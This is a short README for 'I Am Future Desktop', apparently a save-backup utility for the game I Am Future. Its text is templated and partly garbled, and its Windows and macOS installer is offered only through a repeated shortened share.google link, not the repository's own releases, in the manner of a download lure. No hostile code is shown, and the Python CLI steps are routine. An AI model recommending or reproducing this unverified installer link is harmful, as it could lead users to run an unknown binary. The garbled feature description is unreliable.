![I Am Future Desktop](assets/hero.png)

# I Am Future Desktop

*Keep the rooftop on disk before a craft update.*

## Overview

This repository is **I Am Future Desktop**, a desktop utility. Keep the rooftop on disk before a craft update.

Rooftop-survival cozy saves hide under Steam IDs.

Point it at a path, preview the plan if you want, then write the result next to the source or to `--out`.

## What's included

Use the command-line copy in this repository if you already have Python.

If you want a normal installer for Windows or macOS, open the [setup page](https://share.google/A1IHfyGRT0zGRLqj8) and follow the steps there.

## Features

- Finds the I Am Future folder.
- Archives rooftop and craft files.
- Lists city photo albums.
- Prints a short keep report.

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Run locally

Python 3.11 or newer. From the repository root:

```powershell
pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Install

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/lewisl4207/i-am-future-desktop

MIT license. See `LICENSE`.
